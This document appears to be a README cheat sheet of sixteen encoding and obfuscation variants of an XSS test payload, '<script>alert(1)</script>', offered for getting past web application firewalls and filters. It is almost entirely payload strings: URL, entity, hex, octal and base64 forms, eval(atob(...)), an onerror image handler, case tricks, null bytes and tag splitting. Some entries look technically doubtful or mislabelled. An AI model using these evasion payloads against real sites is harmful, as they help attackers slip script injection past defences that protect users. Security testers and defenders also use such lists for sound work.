# PayloadEncoder
Payload Encoder
When trying to bypass Web Application Firewalls (WAFs) or filters, encoding and obfuscation techniques can help evade basic detection. Below are various methods to encode or obfuscate the payload "<script>alert(1)</script>":
1. URL Encoding

    Full URL encoding:

    html

%3Cscript%3Ealert%281%29%3C%2Fscript%3E

Partial URL encoding (only encode specific characters):

html

    <script>alert&#40;1&#41;</script>

2. HTML Entity Encoding

    Using HTML entities for all characters:

    html

&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

Mixed HTML entities:

html

    &#x3C;script&#x3E;alert(&#49;)&#x3C;/script&#x3E;

3. Hexadecimal Encoding

    Using hexadecimal escape sequences:

    html

    \x3Cscript\x3Ealert\x281\x29\x3C/script\x3E

4. Base64 Encoding

    Encoding the entire payload:

    html

PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Decoding in an HTML context:

html

    <script>eval(atob('YWxlcnQoMSk='))</script>

5. Double URL Encoding

    Encoding the URL-encoded version again:

    html

    %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E

6. Hexadecimal Representation of Characters

    Using hex representation:

    html

    \u003Cscript\u003Ealert(1)\u003C\u002Fscript\u003E

7. Octal Encoding

    Using octal representation:

    html

    \074script\076alert(1)\074\057script\076

8. JavaScript Escape Sequences

    Escaping characters within JavaScript:

    html

    <script>\x61\x6c\x65\x72\x74\x28\x31\x29</script>

9. Mixed Encoding

    Combining different encoding methods:

    html

    &#x3C;&#x73;&#99;r&#105;p&#x74;&#x3E;&#97;&#x6C;&#x65;&#x72;&#116;&#x28;&#49;&#x29;&#x3C;&#x2F;&#115;&#x63;&#x72;&#105;&#112;&#116;&#x3E;

10. Non-Printable Characters

    Injecting non-printable characters:

    html

    <scri%00pt>alert(1)</scri%00pt>

11. Breaking Up the Script Tag

    Fragmenting the <script> tag:

    html

    <scr"+"ipt>alert(1)</scr"+"ipt>

12. Using Backticks

    Using backticks in place of single or double quotes:

    html

    <script>alert(`1`)</script>

13. Expression and Eval

    Using eval or expression in inline JavaScript:

    html

    <img src=x onerror="eval('alert(1)')">

14. Lowercase and Uppercase

    Altering case:

    html

    <sCriPt>alert(1)</sCriPt>

15. Polyglot Payload

    Crafting a payload that can be interpreted differently depending on the context:

    html

    <scri<script>pt>alert(1)</scri</script>pt>

16. Inline Comments

    Adding inline comments to break up the script:

    html

<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
